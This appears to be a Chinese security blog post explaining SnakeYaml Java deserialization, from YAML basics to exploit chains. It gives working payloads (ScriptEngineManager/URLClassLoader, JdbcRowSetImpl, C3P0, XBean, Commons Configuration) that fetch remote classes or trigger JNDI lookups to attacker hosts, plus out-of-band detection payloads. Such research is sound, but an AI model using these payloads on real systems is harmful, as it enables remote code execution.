# SnakeYaml链

  
  
&lt;!--more--&gt;  
## 0x01 Yaml基础  
SnakeYaml 是 Java 的 yaml 解析类库，支持 Java 对象的序列化/反序列化。  
Yaml 语法  
1、Yaml 大小写敏感  
2、使用缩进代表层级关系，这点和properties文件的差别很大  
3、缩进只能使用空格，只需要相同层级左对齐  
Yaml 支持三种数据结构  
1、对象  
使用冒号代表，格式为`key:value`。冒号后面要加一个空格  
```yaml  
key:value  
```  
可以使用缩进代表层级关系  
```yaml  
key:  
	chind-key:value  
	chind-key2:value2  
```  
2、数组  
使用一个短横线加一个空格代表一个数组  
```yaml  
hobby:  
	- Java  
	- Python  
```  
3、常量  
Yaml 中提供了多种常量结构，包括：整数、浮点数、字符串、NULL、日期、布尔、时间。  
Demo  
```yaml  
boolean:   
    - TRUE  #true,True都可以  
    - FALSE  #false，False都可以  
float:  
    - 3.14  
    - 6.8523015e&#43;5  #可以使用科学计数法  
int:  
    - 123  
    - 0b1010_0111_0100_1010_1110    #二进制表示  
null:  
    nodeName: &#39;node&#39;  
    parent: ~  #使用~表示null  
string:  
    - 哈哈  
    - &#39;Hello world&#39;  #可以使用双引号或者单引号包裹特殊字符  
    - newline  
      newline2    #字符串可以拆成多行，每一行会被转化成一个空格  
date:  
    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd  
datetime:   
    -  2022-07-28T15:02:31&#43;08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用&#43;代表时区  
```  
### SnakeYaml 序列化与反序列化  
pom.xml  
```xml  
&lt;dependency&gt;  
    &lt;groupId&gt;org.yaml&lt;/groupId&gt;  
    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;  
    &lt;version&gt;1.27&lt;/version&gt;  
&lt;/dependency&gt;  
```  
SnakeYaml 提供了`Yaml.dump()`和`Yaml.load()`两个函数对 yaml 格式的数据进行序列化和反序列化  
Yaml.load() 参数是一个字符串或者一个文件，经过序列化之后返回一个 Java 对象  
Yaml.dump() 将一个对象转换为 yaml 文件格式  
dump 是序列化，load是反序列化。  
Person.java  
```java  
package SerializeDemo;    
    
public class Person {    
    
    private String name;    
    private Integer age;    
    
    public Person() {    
    }    
    
    public Person(String name, Integer age) {    
        this.name = name;    
        this.age = age;    
    }    
    
    public void printInfo(){    
        System.out.println(&#34;name is &#34; &#43; this.name &#43; &#34;age is&#34; &#43; this.age);    
    }    
    
    public String getName() {    
        return name;    
    }    
    
    public void setName(String name) {    
        this.name = name;    
    }    
    
    public Integer getAge() {    
        return age;    
    }    
    
    public void setAge(Integer age) {    
        this.age = age;    
    }    
}  
```  
序列化和反序列化的代码  
```java  
package SerializeDemo;    
    
import org.yaml.snakeyaml.Yaml;    
    
public class YamlSerialize {    
    public static void main(String[] args) {    
        //serialize();    
        unserialize();    
    }    
    public static void serialize(){    
        Person person = new Person();    
        person.setName(&#34;huahua&#34;);    
        person.setAge(18);    
        Yaml yaml = new Yaml();    
        String str = yaml.dump(person);    
        System.out.println(str);    
    }    
    
    public static void unserialize(){    
        String str1 = &#34;!!SerializeDemo.Person {age: 18, name: huahua}&#34;;    
        //String str2 = &#34;age:18\n&#34;&#43;&#34;name:huahua&#34;;    
        Yaml yaml = new Yaml();    
        yaml.load(str1);    
       //yaml.loadAs(str1, Person.class);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409261654939.png)
反序列化值`!!SerializeDemo.Person {age: 18, name: huahua}`  
`!!`类似于 Fastjson 的`@type`用于指定反序列化的全类名  
会自动调用`getter/setter`方法  
Person.java  
```java  
package SerializeDemo;    
    
public class Person {    
    
    private String name;    
    private Integer age;    
    
    public Person() {    
    }    
    
    public Person(String name, Integer age) {    
        this.name = name;    
        this.age = age;    
    }    
    
    public void printInfo(){    
        System.out.println(&#34;name is &#34; &#43; this.name &#43; &#34;age is&#34; &#43; this.age);    
    }    
    
    public String getName() {    
        System.out.println(&#34;Function getName&#34;);    
        return name;    
    }    
    
    public void setName(String name) {    
        System.out.println(&#34;Function setName&#34;);    
        this.name = name;    
    }    
    
    public Integer getAge() {    
        System.out.println(&#34;Function getAge&#34;);    
        return age;    
    }    
    
    public void setAge(Integer age) {    
        System.out.println(&#34;Function setAge&#34;);    
        this.age = age;    
    }    
}  
```  
看一下反序列化的时候发生了什么  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409262000506.png)
调用了`setter`方法，如果我把反序列化的语句改成`&#34;!!SerializeTest.Person {name: Drunkbaby}&#34;`，那么就只会调用`setter`中的`setName`方法  
同样，对于`loadAs()`和`loads()`同样如此  
## 0x02 SPI 链  
### 漏洞原理  
类似于 Fastjson 漏洞，  
与 Fastjson 不同的是，Fastjson 可以调用`getter/setter`方法，而`SnakeYaml`只能调用非`public static 以及 transient`作用域的`setter`方法  
### 利用SPI机制-基于 ScriptEngineManager 利用链  
调用栈  
```java  
newInstance:396, Class (java.lang)    
nextService:380, ServiceLoader$LazyIterator (java.util)    
next:404, ServiceLoader$LazyIterator (java.util)    
next:480, ServiceLoader$1 (java.util)    
initEngines:122, ScriptEngineManager (javax.script)    
init:84, ScriptEngineManager (javax.script)    
&lt;init&gt;:75, ScriptEngineManager (javax.script)    
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)    
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)    
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)    
newInstance:423, Constructor (java.lang.reflect)    
construct:557, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)    
construct:341, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)    
constructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)    
constructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)    
getSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)    
loadFromReader:450, Yaml (org.yaml.snakeyaml)    
load:369, Yaml (org.yaml.snakeyaml)    
main:10, Demo (BasicKnow.SnakeymlUnser)  
```  
### EXP  
```java  
package SerializeDemo;    
    
import org.yaml.snakeyaml.Yaml;    
public class SPIEngineScriptExp {    
    public static void main(String[] args) {    
        String payload = &#34;!!javax.script.ScriptEngineManager &#34; &#43;   
                &#34;[!!java.net.URLClassLoader &#34; &#43;    
                &#34;[[!!java.net.URL [\&#34;http://3c824ba6.log.dnslog.biz\&#34;]]]]\n&#34;;    
        Yaml yaml = new Yaml();    
        yaml.load(payload);    
    }    
}  
```  
但是这个 EXP 只能简单的进行检测，实现 RCE，需要用到 Github 项目  
https://github.com/artsploit/yaml-payload/  
直接修改代码即可，脚本也比较简单，就是实现了`ScriptEngineFactory`接口，然后在静态代码块处需填写执行的命令。  
### SPI机制  
SPI 以及 ScriptEngineManager 最早是在 SpEL 表达式里面被提到的。  
SPI，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath路径下的`META-INF/services`文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现  
那么如果需要使用SPI机制需要在Java classpath下的`META-INF/services/`目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409262310282.png)
SPI 是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，只需要添加一个实现。  
## 0x03 SnakeYaml 反序列化漏洞的 Gadgets  
### 基础知识  
先来看一下SPI链子的 EXP  
```java  
String payload = &#34;!!javax.script.ScriptEngineManager &#34; &#43;    
        &#34;[!!java.net.URLClassLoader &#34; &#43;    
        &#34;[[!!java.net.URL [\&#34;http://dnslog.cn\&#34;]]]]\n&#34;;    
```  
这里的`[!!`是作为`javax.script.ScriptEngineManager`的属性的，就等于我调用了`javax.script.ScriptEnginemanager`这个类，其实我是在调用它的构造函数，如图，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410091934021.png)
传进去的`URLClassLoader`是作为`ClassLoader`传进去的，所以这个就传成功了  
那么后面的`java.net.URL`呢，它是以`[[!!`开头，说明是`URLClassLoader`的内部属性，可以去看`URLClassLoader`的构造函数，要求我们传入一个 URL 类，所以 EXP 是这样来的   
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410091938196.png)
### JdbcRowSetImpl  
调用链比较简单，尾部是 JNDI 注入，是在`com.sun.rowset.JdbcRowSetImpl`的`connect()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410091939338.png)
在`setAutoCommit`是可被利用的`setter`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410091940663.png)
于是调用链就是  
```java  
JdbcRowSetImpl#setAutoCommit  
	JdbcRowSetImpl#connect  
		InitialContext#lookup  
poc  
String payload = &#34;!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \&#34;rmi://127.0.0.1:1099/xfe5br\&#34;,autoCommit: true}&#34;;  
```  
### Spring PropertyPathFactoryBean  
EXP  
```java  
       String payload = &#34;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&#34; &#43;      
                &#34; targetBeanName: \&#34;ldap://localhost:1389/Exploit\&#34;\n&#34; &#43;      
                &#34; propertyPath: ccccc\n&#34; &#43;      
                &#34; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&#34; &#43;      
                &#34;  shareableResources: [\&#34;ldap://localhost:1389/Exploit\&#34;]&#34;;  
```  
### Apache XBean  
无版本限制  
```java  
&lt;dependency&gt;    
  &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;    
  &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt;    
  &lt;version&gt;4.20&lt;/version&gt;    
&lt;/dependency&gt;  
```  
#### 链尾  
在`ContextUtil`的内部类`ReadOnlyBinding`里面的`getObject()`方法里面，调用了`ContextUtil.resolve()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410092019308.png)
跟进看一下`resolve()`，在这里第 55 行，找到一个 JNDI 注入点  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410092052973.png)
此处就可以找到我们的链尾了  
#### EXP的分析与构造  
```java  
String payload = &#34;!!javax.management.BadAttributeValueExpException &#34; &#43;    
        &#34;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &#34; &#43;    
        &#34;[\&#34;huahua\&#34;,!!javax.naming.Reference [\&#34;foo\&#34;, \&#34;JndiCalc\&#34;, \&#34;http://localhost:7777/\&#34;],&#34;&#43;    
        &#34;!!org.apache.xbean.naming.context.WritableContext []]]&#34;;  
```  
在`BadAttributeValueExpException`类中，构造函数对 val 进行了赋值操作，并且调用了其`toString()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410092057569.png)
赋值为`org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding`类，但是`ReadOnlyBinding`类中并没有`toString`方法，但其父类存在  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410092059869.png)
并且正好调用了`getObject()`方法，进行了 JNDI 注入  
### C3P0 JndiRefForwardingDataSource  
打 C3P0 的这条链子  
```java  
        String payload = &#34;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&#34; &#43;      
                &#34;  jndiName: \&#34;rmi://localhost/Exploit\&#34;\n&#34; &#43;      
                &#34;  loginTimeout: 0&#34;;  
```  
### C3P0 WrapperConnectionPoolDataSource  
EXP  
打二次反序列化  
```java  
String poc = &#34;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&#34; &#43;    
&#34;  userOverridesAsString: \&#34;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\&#34;&#34;;  
```  
### Apache Commons Configuration  
依赖包  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;commons-configuration&lt;/groupId&gt;    
    &lt;artifactId&gt;commons-configuration&lt;/artifactId&gt;    
    &lt;version&gt;1.10&lt;/version&gt;    
&lt;/dependency&gt;  
```  
payload如下  
```java  
String payload = &#34;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&#34;ldap://127.0.0.1:1389/xfe5br\&#34;]]: 1&#34;;  
```  
在对`ConfigurationMap`调用`hashCode()`的时候实际上执行了`java.util.AbstractMap#hashCode()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202410092125647.png)
之后就会调用`org.apache.commons.configuration.ConfigurationMap.ConfigurationMap.ConfigurationSet#iterator()`  
之后就可以配置 JNDIConfiguration 实现 JNDI 注入  
```java  
lookup:417, InitialContext (javax.naming)    
getBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)    
getKeys:203, JNDIConfiguration (org.apache.commons.configuration)    
getKeys:182, JNDIConfiguration (org.apache.commons.configuration)  
```  
## 0x04 SnakeYaml的探测  
### SPI的探测链子  
```java  
String payload = &#34;!!javax.script.ScriptEngineManager &#34; &#43;   
		&#34;[!!java.net.URLClassLoader &#34; &#43;    
		&#34;[[!!java.net.URL [\&#34;http://3c824ba6.log.dnslog.biz\&#34;]]]]\n&#34;;  
```  
### 使用 key 调用 hashCode 方法探测  
EXP  
```java  
String payload = &#34;{!!java.net.URL [\&#34;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&#34;]: 1}&#34;;  
```  
### 探测内部类  
```java  
String payload = &#34;{!!java.util.Map {}: 0,!!java.net.URL [\&#34;http://tcbua9.ceye.io/\&#34;]: 1}&#34;;  
```  
在前面加上需要探测的类，如果在反序列化过程中没有报错，说明反序列化成功了，存在该类  
这里创建对象的时候使用的是`{}`这种代表无参构造，所以需要存在无参构造函数，不然需要使用`[]`进行复制构造  

---

> Author: N1Rvana  
> URL: http://localhost:1313/snakeyaml%E9%93%BE/  

